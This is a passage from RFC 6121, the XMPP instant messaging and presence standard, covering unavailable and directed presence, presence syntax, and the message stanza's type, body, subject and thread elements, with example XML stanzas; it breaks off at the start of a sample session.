      the user's subsequent presence notifications to contacts who are
      offline (as described under [Section 4.4.2](#section-4.4.2)), it MUST broadcast the
      user's unavailable presence notification; if it did not do so, the
      last presence received by the contact's server would be the user's
      initial presence for the presence session, with the result that
      the contact would consider the user to be online.

      Implementation Note: See [Section 4.6](#section-4.6) regarding rules that
      supplement the foregoing for handling of directed presence.

   If the unavailable notification was gracefully received from the
   client, then the server MUST broadcast the full XML of the presence
   stanza.

   US: <presence from='juliet@example.com/balcony'
                 to='romeo@example.net'
                 type='unavailable'>
         <status>going on vacation</status>
       </presence>

   US: <presence from='juliet@example.com/balcony'
                 to='benvolio@example.net'
                 type='unavailable'>
         <status>going on vacation</status>
       </presence>

   US: <presence from='juliet@example.com/balcony'
                 to='mercutio@example.com'
                 type='unavailable'>
         <status>going on vacation</status>
       </presence>

Saint-Andre                  Standards Track                   [Page 60]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   The user's server MUST also send the unavailable notification to all
   of the user's available resources (as well as to the resource that
   generated the unavailable presence in the first place).

   US: <presence from='juliet@example.com/balcony'
                 to='juliet@example.com/chamber'
                 type='unavailable'>
         <status>going on vacation</status>
       </presence>

   If the server detects that the user has gone offline ungracefully,
   then the server MUST generate the unavailable presence broadcast on
   the user's behalf.

      Implementation Note: Any presence stanza with no 'type' attribute
      and no 'to' attribute that the client sends after the server
      broadcasts or generates an unavailable presence notification MUST
      be routed or delivered by the user's server to all subscribers
      (i.e., MUST be treated as equivalent to initial presence for a new
      presence session).

[4.5.3](#section-4.5.3).  Server Processing of Inbound Unavailable Presence

   Upon receiving an unavailable notification from the user, the
   contact's server MUST deliver the user's presence stanza to all of
   the contact's available resources.

   [ ... to resource1 ... ]

   CS: <presence from='juliet@example.com/balcony'
                 to='romeo@example.net'
                 type='unavailable'>
         <status>going on vacation</status>
       </presence>

   [ ... to resource2 ... ]

   CS: <presence from='juliet@example.com/balcony'
                 to='romeo@example.net'
                 type='unavailable'>
         <status>going on vacation</status>
       </presence>

      Implementation Note: If the contact's server does not broadcast
      subsequent presence notifications to users who are offline (as
      described under [Section 4.4.2](#section-4.4.2)), it MUST also update its internal
      representation of which entities are online by noting that the
      user is unavailable.

Saint-Andre                  Standards Track                   [Page 61]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

[4.5.4](#section-4.5.4).  Client Processing of Unavailable Presence

   From the perspective of the contact's client, there is no significant
   difference between available presence broadcast and unavailable
   presence broadcast, so in general the contact's client follows the
   rules for processing of inbound presence defined under [Section 4.4.3](#section-4.4.3).

   However, if the contact receives an unavailable notification from the
   bare JID of the user (rather than the full JID of a particular
   available resource), the contact's client SHOULD treat the
   unavailable notification as applying to all resources.

[4.6](#section-4.6).  Directed Presence

   This section supplements the rules for client and server processing
   of presence notifications and presence probes, but only for the
   special case of directed presence.

[4.6.1](#section-4.6.1).  General Considerations

   In general, a client sends directed presence when it wishes to share
   availability information with an entity that is not subscribed to its
   presence, typically on a temporary basis.  Common uses of directed
   presence include casual one-to-one chat sessions as described under
   [Section 5.1](#section-5.1) and multi-user chat rooms as described in [[XEP-0045](#ref-XEP-0045)].

   The temporary relationship established by sharing directed presence
   with another entity is secondary to the permanent relationship
   established through a presence subscription.  Therefore, the acts of
   creating, modifying, or canceling a presence subscription MUST take
   precedence over the rules specified in the following subsections.
   For example, if a user shares directed presence with a contact but
   then adds the contact to the user's roster by completing the presence
   subscription "handshake", the user's server MUST treat the contact
   just as it would any normal subscriber as described under [Section 3](#section-3),
   for example, by sending subsequent presence broadcasts to the
   contact.  As another example, if the user then cancels the contact's
   subscription to the user's presence, the user's server MUST handle
   the cancellation just as it normally would as described under
   [Section 3.2](#section-3.2), which includes sending unavailable presence to the
   contact even if the user has sent directed presence to the contact.

   XMPP servers typically implement directed presence by keeping a list
   of the entities (bare JIDs or full JIDs) to which a user has sent
   directed presence during the user's current session for a given
   resource (full JID), then clearing the list when the user goes
   offline (e.g., by sending a broadcast presence stanza of type
   "unavailable").  The server MUST remove from the directed presence

Saint-Andre                  Standards Track                   [Page 62]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   list (or its functional equivalent) any entity to which the user
   sends directed unavailable presence and SHOULD remove any entity that
   sends unavailable presence to the user.

[4.6.2](#section-4.6.2).  Client Generation of Directed Presence

   As noted, directed presence is a client-generated presence stanza
   with a 'to' attribute whose value is the bare JID or full JID of the
   other entity and with either no 'type' attribute (indicating
   availability) or a 'type' attribute whose value is "unavailable".

[4.6.3](#section-4.6.3).  Server Processing of Outbound Directed Presence

   When the user's server receives a directed presence stanza, it SHOULD
   process it according to the following rules.

   1.  If the user sends directed available or unavailable presence to a
       contact that is in the user's roster with a subscription type of
       "from" or "both" after having sent initial presence and before
       sending unavailable presence broadcast (i.e., during the user's
       presence session), the user's server MUST locally deliver or
       remotely route the full XML of that presence stanza but SHOULD
       NOT otherwise modify the contact's status regarding presence
       broadcast (i.e., it SHOULD include the contact's JID in any
       subsequent presence broadcasts initiated by the user).

   2.  If the user sends directed presence to an entity that is not in
       the user's roster with a subscription type of "from" or "both"
       after having sent initial presence and before sending unavailable
       presence broadcast (i.e., during the user's presence session),
       the user's server MUST locally deliver or remotely route the full
       XML of that presence stanza to the entity but MUST NOT modify the
       contact's status regarding available presence broadcast (i.e., it
       MUST NOT include the entity's JID in any subsequent broadcasts of
       available presence initiated by the user); however, if the
       available resource from which the user sent the directed presence
       becomes unavailable, the user's server MUST route that
       unavailable presence to the entity (if the user has not yet sent
       directed unavailable presence to that entity).

   3.  If the user sends directed presence without first sending initial
       presence or after having sent unavailable presence broadcast
       (i.e., the resource is connected but not available), the user's
       server MUST treat the entity to which the user sends directed
       presence as in case #2 above.

Saint-Andre                  Standards Track                   [Page 63]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

[4.6.4](#section-4.6.4).  Server Processing of Inbound Directed Presence

   From the perspective of the contact's server, there is no significant
   difference between presence broadcast and directed presence, so the
   contact's server follows the rules for processing of inbound presence
   defined under Sections [4.3.2](#section-4.3.2), [4.4.3](#section-4.4.3), and [4.5.3](#section-4.5.3).

[4.6.5](#section-4.6.5).  Client Processing of Inbound Directed Presence

   From the perspective of the contact's client, there is no significant
   difference between presence broadcast and directed presence, so the
   contact's client follows the rules for processing of inbound presence
   defined under [Section 4.4.3](#section-4.4.3).

[4.6.6](#section-4.6.6).  Server Processing of Presence Probes

   If a user's client has sent directed presence to another entity
   (e.g., a one-to-one chat partner or a multi-user chat room), after
   some time the entity or its server might want to know if the client
   is still online.  This scenario is especially common in the case of
   multi-user chat rooms, in which the user might be a participant for a
   long period of time.  If the user's client goes offline without the
   chat room being informed (either by the client or the client's
   server), the user's representation in the room might become a "ghost"
   that appears to be participating but that in fact is no longer
   present in the room.  To detect such "ghosts", some multi-user chat
   room implementations send presence probes to users that have joined
   the room.

   In the case of directed presence, the probing entity SHOULD send the
   probe from the JID that received directed presence (whether a full
   JID or a bare JID).  The probe SHOULD be sent to the user's full JID,
   not the user's bare JID without a resourcepart, because the temporary
   "authorization" involved with directed presence is based on the full
   JID from which the user sent directed presence to the probing entity.
   When the user's server receives a probe, it MUST first apply any
   logic associated with presence subscriptions as described under
   [Section 4.3.2](#section-4.3.2).  If the probing entity does not have a subscription to
   the user's presence, then the server MUST check if the user has sent
   directed presence to the entity during its current session; if so,
   the server SHOULD answer the probe with only mere presence of type
   "available" or "unavailable" (i.e., not including child elements) and
   only for that full JID (i.e., not for any other resources that might
   be currently associated with the user's bare JID).

Saint-Andre                  Standards Track                   [Page 64]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

[4.7](#section-4.7).  Presence Syntax

[4.7.1](#section-4.7.1).  Type Attribute

   The absence of a 'type' attribute signals that the relevant entity is
   available for communication (see [Section 4.2](#section-4.2) and [Section 4.4](#section-4.4)).

   A 'type' attribute with a value of "unavailable" signals that the
   relevant entity is not available for communication (see [Section 4.5](#section-4.5)).

   The XMPP presence stanza is also used to negotiate and manage
   subscriptions to the presence of other entities.  These tasks are
   completed via presence stanzas of type "subscribe", "unsubscribe",
   "subscribed", and "unsubscribed" as described under [Section 3](#section-3).

   If a user and contact are associated with different XMPP servers,
   those servers also use a special presence stanza of type "probe" in
   order to determine the availability of the entity on the peer server;
   details are provided under [Section 4.3](#section-4.3).  Clients SHOULD NOT send
   presence stanzas of type "probe".

   The values of the 'type' attribute can be summarized as follows:

   o  error -- An error has occurred regarding processing of a
      previously sent presence stanza; if the presence stanza is of type
      "error", it MUST include an <error/> child element (refer to
      [[XMPP-CORE](#ref-XMPP-CORE)]).

   o  probe -- A request for an entity's current presence; SHOULD be
      generated only by a server on behalf of a user.

   o  subscribe -- The sender wishes to subscribe to the recipient's
      presence.

   o  subscribed -- The sender has allowed the recipient to receive
      their presence.

   o  unavailable -- The sender is no longer available for
      communication.

   o  unsubscribe -- The sender is unsubscribing from the receiver's
      presence.

   o  unsubscribed -- The subscription request has been denied or a
      previously granted subscription has been canceled.

Saint-Andre                  Standards Track                   [Page 65]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   If the value of the 'type' attribute is not one of the foregoing
   values, the recipient or an intermediate router SHOULD return a
   stanza error of <bad-request/>.

      Implementation Note: There is no default value for the 'type'
      attribute of the <presence/> element.

      Implementation Note: There is no value of "available" for the
      'type' attribute of the <presence/> element.

[4.7.2](#section-4.7.2).  Child Elements

   In accordance with the default namespace declaration, a presence
   stanza is qualified by the 'jabber:client' or 'jabber:server'
   namespace, which defines certain child elements of presence stanzas,
   in particular the <show/>, <status/>, and <priority/> elements.
   These child elements are used to provide more detailed information
   about an entity's availability.  Typically these child elements are
   included only if the presence stanza possesses no 'type' attribute,
   although exceptions are noted in the text that follows.

[4.7.2.1](#section-4.7.2.1).  Show Element

   The OPTIONAL <show/> element specifies the particular availability
   sub-state of an entity or a specific resource thereof.  A presence
   stanza MUST NOT contain more than one <show/> element.  There are no
   attributes defined for the <show/> element.  The <show/> element MUST
   NOT contain mixed content (as defined in Section 3.2.2 of [[XML](#ref-XML "\"Extensible Markup Language (XML) 1.0 (Fifth Edition)\"")]).
   The XML character data of the <show/> element is not meant for
   presentation to a human user.  The XML character data MUST be one of
   the following (additional availability states could be defined
   through extended content elements):

   o  away -- The entity or resource is temporarily away.

   o  chat -- The entity or resource is actively interested in chatting.

   o  dnd -- The entity or resource is busy (dnd = "Do Not Disturb").

   o  xa -- The entity or resource is away for an extended period (xa =
      "eXtended Away").

   If no <show/> element is provided, the entity is assumed to be online
   and available.

   Any specialized processing of availability states by recipients and
   intermediate routers is up to the implementation (e.g., incorporation
   of availability states into stanza routing and delivery logic).

Saint-Andre                  Standards Track                   [Page 66]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

[4.7.2.2](#section-4.7.2.2).  Status Element

   The OPTIONAL <status/> element contains human-readable XML character
   data specifying a natural-language description of an entity's
   availability.  It is normally used in conjunction with the show
   element to provide a detailed description of an availability state
   (e.g., "In a meeting") when the presence stanza has no 'type'
   attribute.

   <presence from='romeo@example.net/orchard'
             xml:lang='en'>
     <show>dnd</show>
     <status>Wooing Juliet</status>
   </presence>

   There are no attributes defined for the <status/> element, with the
   exception of the 'xml:lang' attribute inherited from [[XML](#ref-XML "\"Extensible Markup Language (XML) 1.0 (Fifth Edition)\"")].  The
   <status/> element MUST NOT contain mixed content (as defined in
   Section 3.2.2 of [[XML](#ref-XML "\"Extensible Markup Language (XML) 1.0 (Fifth Edition)\"")]).  Multiple instances of the <status/> element
   MAY be included, but only if each instance possesses an 'xml:lang'
   attribute with a distinct language value (either explicitly or by
   inheritance from the 'xml:lang' value of an element farther up in the
   XML hierarchy, which from the sender's perspective can include the
   XML stream header as described in [[XMPP-CORE](#ref-XMPP-CORE)]).

   <presence from='romeo@example.net/orchard'
             id='jx62vs97'
             xml:lang='en'>
     <show>dnd</show>
     <status>Wooing Juliet</status>
     <status xml:lang='cs'>Dvo&#x0159;&#x00ED;m se Julii</status>
   </presence>

   A presence stanza of type "unavailable" MAY also include a <status/>
   element to provide detailed information about why the entity is going
   offline.

   <presence from='romeo@example.net/orchard'
             id='oy6sb241'
             type='unavailable'
             xml:lang='en'>
     <status>Busy IRL</status>
   </presence>

Saint-Andre                  Standards Track                   [Page 67]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   The <status/> child MAY also be sent in a subscription-related
   presence stanza (i.e., type "subscribe", "subscribed", "unsubscribe",
   or "unsubscribed") to provide a description of the action.  An
   interactive client MAY present this <status/> information to a human
   user (see [Section 11](#section-11)).

   <presence from='romeo@example.net'
             id='uc51xs63'
             to='nurse@example.com'
             type='subscribe'>
     <status>Hi, Juliet told me to add you to my buddy list.</status>
   </presence>

[4.7.2.3](#section-4.7.2.3).  Priority Element

   The OPTIONAL <priority/> element contains non-human-readable XML
   character data that specifies the priority level of the resource.
   The value MUST be an integer between -128 and +127.  A presence
   stanza MUST NOT contain more than one <priority/> element.  There are
   no attributes defined for the <priority/> element.  The <priority/>
   element MUST NOT contain mixed content (as defined in Section 3.2.2
   of [[XML](#ref-XML "\"Extensible Markup Language (XML) 1.0 (Fifth Edition)\"")]).

   <presence xml:lang='en'>
     <show>dnd</show>
     <status>Wooing Juliet</status>
     <status xml:lang='cs'>Dvo&#x0159;&#x00ED;m se Julii</status>
     <priority>1</priority>
   </presence>

   If no priority is provided, the processing server or client MUST
   consider the priority to be zero ("0").

   The client's server MAY override the priority value provided by the
   client (e.g., in order to impose a message handling rule of
   delivering a message intended for the account's bare JID to all of
   the account's available resources).  If the server does so, it MUST
   communicate the modified priority value when it echoes the client's
   presence back to itself and sends the presence notification to the
   user's contacts (because this modified priority value is typically
   the default value of zero, communicating the modified priority value
   can be done by not including the <priority/> child element).

   For information regarding the semantics of priority values in stanza
   processing within instant messaging and presence applications, refer
   to [Section 8](#section-8).

Saint-Andre                  Standards Track                   [Page 68]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

[4.7.3](#section-4.7.3).  Extended Content

   As described in [[XMPP-CORE](#ref-XMPP-CORE)], an XML stanza MAY contain any child
   element that is qualified by a namespace other than the default
   namespace; this applies to the presence stanza as well.

   (In the following example, the presence stanza includes entity
   capabilities information as defined in [[XEP-0115](#ref-XEP-0115)].)

   <presence from='romeo@example.net'>
     <c xmlns='http://jabber.org/protocol/caps'
        hash='sha-1'
        node='http://psi-im.org'
        ver='q07IKJEyjvHSyhy//CH0CxmKi8w='/>
   </presence>

   Any extended content included in a presence stanza SHOULD represent
   aspects of an entity's availability for communication or provide
   information about communication-related capabilities.

[5](#section-5).  Exchanging Messages

   Once a client has authenticated with a server and bound a resource to
   an XML stream as described in [[XMPP-CORE](#ref-XMPP-CORE)], an XMPP server will route
   XML stanzas to and from that client.  One kind of stanza that can be
   exchanged is <message/> (if, that is, messaging functionality is
   enabled on the server).  Exchanging messages is a basic use of XMPP
   and occurs when a user generates a message stanza that is addressed
   to another entity.  As defined under [Section 8](#section-8), the sender's server
   is responsible for delivering the message to the intended recipient
   (if the recipient is on the same local server) or for routing the
   message to the recipient's server (if the recipient is on a remote
   server).  Thus a message stanza is used to "push" information to
   another entity.

[5.1](#section-5.1).  One-to-One Chat Sessions

   In practice, instant messaging activity between human users tends to
   occur in the form of a conversational burst that we call a "chat
   session": the exchange of multiple messages between two parties in
   relatively rapid succession within a relatively brief period of time.

   When a human user intends to engage in such a chat session with a
   contact (rather than sending a single message to which no reply is
   expected), the message type generated by the user's client SHOULD be
   "chat" and the contact's client SHOULD preserve that message type in
   subsequent replies.  The user's client also SHOULD include a

Saint-Andre                  Standards Track                   [Page 69]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   <thread/> element with its initial message, which the contact's
   client SHOULD also preserve during the life of the chat session (see
   [Section 5.2.5](#section-5.2.5)).

   The user's client SHOULD address the initial message in a chat
   session to the bare JID <contact@domainpart> of the contact (rather
   than attempting to guess an appropriate full JID
   <contact@domainpart/resourcepart> based on the <show/>, <status/>, or
   <priority/> value of any presence notifications it might have
   received from the contact).  Until and unless the user's client
   receives a reply from the contact, it SHOULD send any further
   messages to the contact's bare JID.  The contact's client SHOULD
   address its replies to the user's full JID
   <user@domainpart/resourcepart> as provided in the 'from' address of
   the initial message.  Once the user's client receives a reply from
   the contact's full JID, it SHOULD address its subsequent messages to
   the contact's full JID as provided in the 'from' address of the
   contact's replies, thus "locking in" on that full JID.  A client
   SHOULD "unlock" after having received a <message/> or <presence/>
   stanza from any other resource controlled by the peer (or a presence
   stanza from the locked resource); as a result, it SHOULD address its
   next message(s) in the chat session to the bare JID of the peer (thus
   "unlocking" the previous "lock") until it receives a message from one
   of the peer's full JIDs.

   When two parties engage in a chat session but do not share presence
   with each other based on a presence subscription, they SHOULD send
   directed presence to each other so that either party can easily
   discover if the peer goes offline during the course of the chat
   session.  However, a client MUST provide a way for a user to disable
   such presence sharing globally or to enable it only with particular
   entities.  Furthermore, a party SHOULD send directed unavailable
   presence to the peer when it has reason to believe that the chat
   session is over (e.g., if, after some reasonable amount of time, no
   subsequent messages have been exchanged between the parties).

   An example of a chat session is provided under [Section 7](#section-7).

[5.2](#section-5.2).  Message Syntax

   The following sections describe the syntax of the <message/> stanza.

[5.2.1](#section-5.2.1).  To Attribute

   An instant messaging client specifies an intended recipient for a
   message by providing the JID of the intended recipient in the 'to'
   attribute of the <message/> stanza.

Saint-Andre                  Standards Track                   [Page 70]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   If the message is being sent outside the context of any existing chat
   session or received message, the value of the 'to' address SHOULD be
   of the form <localpart@domainpart> rather than of the form
   <localpart@domainpart/resourcepart> (see [Section 5.1](#section-5.1)).

   <message
       from='juliet@example.com/balcony'
       id='ktx72v49'
       to='romeo@example.net'
       type='chat'
       xml:lang='en'>
     <body>Art thou not Romeo, and a Montague?</body>
   </message>

   If the message is being sent in reply to a message previously
   received from an address of the form
   <localpart@domainpart/resourcepart> (e.g., within the context of a
   one-to-one chat session as described under [Section 5.1](#section-5.1)), the value of
   the 'to' address SHOULD be of the form
   <localpart@domainpart/resourcepart> rather than of the form
   <localpart@domainpart> unless the sender has knowledge (e.g., via
   presence) that the intended recipient's resource is no longer
   available.

   <message
       from='romeo@example.net/orchard'
       id='sl3nx51f'
       to='juliet@example.com/balcony'
       type='chat'
       xml:lang='en'>
     <body>Neither, fair saint, if either thee dislike.</body>
   </message>

[5.2.2](#section-5.2.2).  Type Attribute

   Common uses of the message stanza in instant messaging applications
   include: single messages; messages sent in the context of a one-to-
   one chat session; messages sent in the context of a multi-user chat
   room; alerts, notifications, or other information to which no reply
   is expected; and errors.  These uses are differentiated via the
   'type' attribute.  Inclusion of the 'type' attribute is RECOMMENDED.
   If included, the 'type' attribute MUST have one of the following
   values:

Saint-Andre                  Standards Track                   [Page 71]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   o  chat -- The message is sent in the context of a one-to-one chat
      session.  Typically an interactive client will present a message
      of type "chat" in an interface that enables one-to-one chat
      between the two parties, including an appropriate conversation
      history.  Detailed recommendations regarding one-to-one chat
      sessions are provided under [Section 5.1](#section-5.1).

   o  error -- The message is generated by an entity that experiences an
      error when processing a message received from another entity (for
      details regarding stanza error syntax, refer to [[XMPP-CORE](#ref-XMPP-CORE)]).  A
      client that receives a message of type "error" SHOULD present an
      appropriate interface informing the original sender regarding the
      nature of the error.

   o  groupchat -- The message is sent in the context of a multi-user
      chat environment (similar to that of [[IRC](#ref-IRC "\"Internet Relay Chat: Architecture\"")]).  Typically a
      receiving client will present a message of type "groupchat" in an
      interface that enables many-to-many chat between the parties,
      including a roster of parties in the chatroom and an appropriate
      conversation history.  For detailed information about XMPP-based
      groupchat, refer to [[XEP-0045](#ref-XEP-0045)].

   o  headline -- The message provides an alert, a notification, or
      other transient information to which no reply is expected (e.g.,
      news headlines, sports updates, near-real-time market data, or
      syndicated content).  Because no reply to the message is expected,
      typically a receiving client will present a message of type
      "headline" in an interface that appropriately differentiates the
      message from standalone messages, chat messages, and groupchat
      messages (e.g., by not providing the recipient with the ability to
      reply).  If the 'to' address is the bare JID, the receiving server
      SHOULD deliver the message to all of the recipient's available
      resources with non-negative presence priority and MUST deliver the
      message to at least one of those resources; if the 'to' address is
      a full JID and there is a matching resource, the server MUST
      deliver the message to that resource; otherwise the server MUST
      either silently ignore the message or return an error (see
      [Section 8](#section-8)).

   o  normal -- The message is a standalone message that is sent outside
      the context of a one-to-one conversation or groupchat, and to
      which it is expected that the recipient will reply.  Typically a
      receiving client will present a message of type "normal" in an
      interface that enables the recipient to reply, but without a
      conversation history.  The default value of the 'type' attribute
      is "normal".

Saint-Andre                  Standards Track                   [Page 72]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   An IM application SHOULD support all of the foregoing message types.
   If an application receives a message with no 'type' attribute or the
   application does not understand the value of the 'type' attribute
   provided, it MUST consider the message to be of type "normal" (i.e.,
   "normal" is the default).

   Guidelines for server handling of different message types is provided
   under [Section 8](#section-8).

   Although the 'type' attribute is OPTIONAL, it is considered polite to
   mirror the type in any replies to a message; furthermore, some
   specialized applications (e.g., a multi-user chat service) MAY at
   their discretion enforce the use of a particular message type (e.g.,
   type='groupchat').

[5.2.3](#section-5.2.3).  Body Element

   The <body/> element contains human-readable XML character data that
   specifies the textual contents of the message; this child element is
   normally included but is OPTIONAL.

   <message
       from='juliet@example.com/balcony'
       id='b4vs9km4'
       to='romeo@example.net'
       type='chat'
       xml:lang='en'>
     <body>Wherefore art thou, Romeo?</body>
   </message>

   There are no attributes defined for the <body/> element, with the
   exception of the 'xml:lang' attribute.  Multiple instances of the
   <body/> element MAY be included in a message stanza for the purpose
   of providing alternate versions of the same body, but only if each
   instance possesses an 'xml:lang' attribute with a distinct language
   value (either explicitly or by inheritance from the 'xml:lang' value
   of an element farther up in the XML hierarchy, which from the
   sender's perspective can include the XML stream header as described
   in [[XMPP-CORE](#ref-XMPP-CORE)]).

Saint-Andre                  Standards Track                   [Page 73]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   <message
       from='juliet@example.com/balcony'
       id='z94nb37h'
       to='romeo@example.net'
       type='chat'
       xml:lang='en'>
     <body>Wherefore art thou, Romeo?</body>
     <body xml:lang='cs'>
        Pro&#x010D;e&#x017D; jsi ty, Romeo?
      </body>
   </message>

   The <body/> element MUST NOT contain mixed content (as defined in
   Section 3.2.2 of [[XML](#ref-XML "\"Extensible Markup Language (XML) 1.0 (Fifth Edition)\"")]).

[5.2.4](#section-5.2.4).  Subject Element

   The <subject/> element contains human-readable XML character data
   that specifies the topic of the message.

   <message
       from='juliet@example.com/balcony'
       id='c8xg3nf8'
       to='romeo@example.net'
       type='chat'
       xml:lang='en'>
     <subject>I implore you!</subject>
     <body>Wherefore art thou, Romeo?</body>
   </message>

   There are no attributes defined for the <subject/> element, with the
   exception of the 'xml:lang' attribute inherited from [[XML](#ref-XML "\"Extensible Markup Language (XML) 1.0 (Fifth Edition)\"")].  Multiple
   instances of the <subject/> element MAY be included for the purpose
   of providing alternate versions of the same subject, but only if each
   instance possesses an 'xml:lang' attribute with a distinct language
   value (either explicitly or by inheritance from the 'xml:lang' value
   of an element farther up in the XML hierarchy, which from the
   sender's perspective can include the XML stream header as described
   in [[XMPP-CORE](#ref-XMPP-CORE)]).

Saint-Andre                  Standards Track                   [Page 74]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   <message
       from='juliet@example.com/balcony'
       id='jk3v47gw'
       to='romeo@example.net'
       type='chat'
       xml:lang='en'>
     <subject>I implore you!</subject>
     <subject xml:lang='cs'>
       &#x00DA;p&#x011B;nliv&#x011B; pros&#x00ED;m!
     </subject>
     <body>Wherefore art thou, Romeo?</body>
     <body xml:lang='cs'>
        Pro&#x010D;e&#x017E; jsi ty, Romeo?
      </body>
   </message>

   The <subject/> element MUST NOT contain mixed content (as defined in
   Section 3.2.2 of [[XML](#ref-XML "\"Extensible Markup Language (XML) 1.0 (Fifth Edition)\"")]).

[5.2.5](#section-5.2.5).  Thread Element

   The primary use of the XMPP <thread/> element is to uniquely identify
   a conversation thread or "chat session" between two entities
   instantiated by <message/> stanzas of type 'chat'.  However, the XMPP
   <thread/> element MAY also be used to uniquely identify an analogous
   thread between two entities instantiated by <message/> stanzas of
   type 'headline' or 'normal', or among multiple entities in the
   context of a multi-user chat room instantiated by <message/> stanzas
   of type 'groupchat'.  It MAY also be used for <message/> stanzas not
   related to a human conversation, such as a game session or an
   interaction between plugins.  The <thread/> element is not used to
   identify individual messages, only conversations or messaging
   sessions.

   The inclusion of the <thread/> element is OPTIONAL.  Because the
   <thread/> element identifies the particular conversation thread to
   which a message belongs, a message stanza MUST NOT contain more than
   one <thread/> element.

   The <thread/> element MAY possess a 'parent' attribute that
   identifies another thread of which the current thread is an offshoot
   or child.  The 'parent' attribute MUST conform to the syntax of the
   <thread/> element itself and its value MUST be different from the XML
   character data of the <thread/> element on which the 'parent'
   attribute is included.

Saint-Andre                  Standards Track                   [Page 75]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

      Implementation Note: The ability to specify both a parent thread
      and a child thread introduces the possibility of conflicts between
      thread identifiers for overlapping threads.  For example, one
      <thread/> element might contain XML character data of "foo" and a
      'parent' attribute whose value is "bar", a second <thread/>
      element might contain XML character data of "bar" and a 'parent'
      attribute whose value is "baz", and a third <thread/> element
      might contain XML character data of "baz" and a 'parent' attribute
      whose value is once again "foo".  It is up to the implementation
      how it will treat conflicts between such overlapping thread
      identifiers (e.g., whether it will "chain together" thread
      identifiers by showing "foo" as both a parent and grandchild of
      "baz" in a multi-level user interface, or whether it will show
      only one level of dependency at a time).

   The value of the <thread/> element is not human-readable and MUST be
   treated as opaque by entities; no semantic meaning can be derived
   from it, and only exact comparisons can be made against it.  The
   value of the <thread/> element MUST uniquely identify the
   conversation thread either between the conversation partners or more
   generally (one way to ensure uniqueness is by generating a
   universally unique identifier (UUID) as described in [[UUID](#ref-UUID "\"A Universally Unique IDentifier (UUID) URN Namespace\"")]).

      Security Warning: An application that generates a ThreadID MUST
      ensure that it does not reveal identifying information about the
      entity (e.g., the MAC address of the device on which the XMPP
      application is running).

   The <thread/> element MUST NOT contain mixed content (as defined in
   Section 3.2.2 of [[XML](#ref-XML "\"Extensible Markup Language (XML) 1.0 (Fifth Edition)\"")]).

   <message
       from='juliet@example.com/balcony'
       to='romeo@example.net'
       type='chat'
       xml:lang='en'>
     <subject>I implore you!</subject>
     <subject xml:lang='cs'>
       &#x00DA;p&#x011B;nliv&#x011B; pros&#x00ED;m!
     </subject>
     <body>Wherefore art thou, Romeo?</body>
     <body xml:lang='cs'>
        Pro&#x010D;e&#x017E; jsi ty, Romeo?
     </body>
     <thread parent='e0ffe42b28561960c6b12b944a092794b9683a38'>
       0e3141cd80894871a68e6fe6b1ec56fa
     </thread>
   </message>

Saint-Andre                  Standards Track                   [Page 76]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   For detailed recommendations regarding use of the <thread/> element,
   refer to [[XEP-0201](#ref-XEP-0201)].

[5.3](#section-5.3).  Extended Content

   As described in [[XMPP-CORE](#ref-XMPP-CORE)], an XML stanza MAY contain any child
   element that is qualified by a namespace other than the default
   namespace; this applies to the message stanza as well.  Guidelines
   for handling extended content on the part of both routing servers and
   end recipients are provided in Section 8.4 of [[XMPP-CORE](#ref-XMPP-CORE)].

   (In the following example, the message stanza includes an XHTML-
   formatted version of the message as defined in [[XEP-0071](#ref-XEP-0071)]).)

   <message
       from='juliet@example.com/balcony'
       to='romeo@example.net'
       type='chat'
       xml:lang='en'>
     <body>Wherefore art thou, Romeo?</body>
     <html xmlns='http://jabber.org/protocol/xhtml-im'>
       <body xmlns='http://www.w3.org/1999/xhtml'>
         <p>Wherefore <span style='font-style: italic'>art</span>
         thou, <span style='color:red'>Romeo</span>?</p>
       </body>
     </html>
   </message>

[6](#section-6).  Exchanging IQ Stanzas

   As described in [[XMPP-CORE](#ref-XMPP-CORE)], IQ stanzas provide a structured request-
   response mechanism.  The basic semantics of that mechanism (e.g.,
   that the 'id' attribute is mandatory) are defined in [[XMPP-CORE](#ref-XMPP-CORE)],
   whereas the specific semantics needed to complete particular use
   cases are defined in all instances by the extended namespace that
   qualifies the direct child element of an IQ stanza of type "get" or
   "set".  The 'jabber:client' and 'jabber:server' namespaces do not
   define any children of IQ stanzas other than the <error/> element
   common to all stanza types.  This document defines one such extended
   namespace, for Managing the Roster ([Section 2](#section-2)).  However, an IQ
   stanza MAY contain structured information qualified by any extended
   namespace.

Saint-Andre                  Standards Track                   [Page 77]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

[7](#section-7).  A Sample Session

   The examples in this section illustrate a possible instant messaging
   and presence session.  The user is <romeo@example.net>, he has an
   available resource whose resourcepart is "orchard", and he has the
   following individuals in his roster:

   o  <juliet@example.com> (subscription="both" and she has two
      available resources, "chamber" and "balcony")

   o  <benvolio@example.net> (subscription="to")

   o  <mercutio@example.org> (subscription="from")

   First, the user completes the preconditions (stream establishment,
   TLS and SASL negotiation, and resource binding) described in
   [[XMPP-CORE](#ref-XMPP-CORE)]; those protocol flows are not reproduced here.

   Next, the user requests his roster.

   Example 1: User requests current roster from server

   UC: <iq from='romeo@example.net/orchard'
           id='hf61v3n7'
           type='get'>
         <query xmlns='jabber:iq:roster'/>
       </iq>

   Example 2: User receives roster from server

   US: <iq id='hf61v3n7'
